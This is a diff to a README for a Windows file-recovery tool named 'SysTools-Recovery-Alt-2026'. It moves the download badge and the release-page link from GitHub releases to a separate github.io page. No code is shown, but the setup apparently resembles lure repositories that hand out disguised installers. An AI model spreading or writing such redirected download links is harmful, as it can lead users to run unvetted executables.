@@ -1,6 +1,6 @@
 # 💾 SysTools-Recovery-Alt-2026 - Recover lost files on Windows systems
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/k4y2816/SysTools-Recovery-Alt-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://k4y2816.github.io)
 
 ## Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official release page](https://github.com/k4y2816/SysTools-Recovery-Alt-2026/releases) to access the installer.
+1. Visit the [official release page](https://k4y2816.github.io) to access the installer.
 2. Select the latest version listed under the Assets section.
 3. Click the link to save the installer file to your computer.
 4. Locate the downloaded file in your Downloads folder.
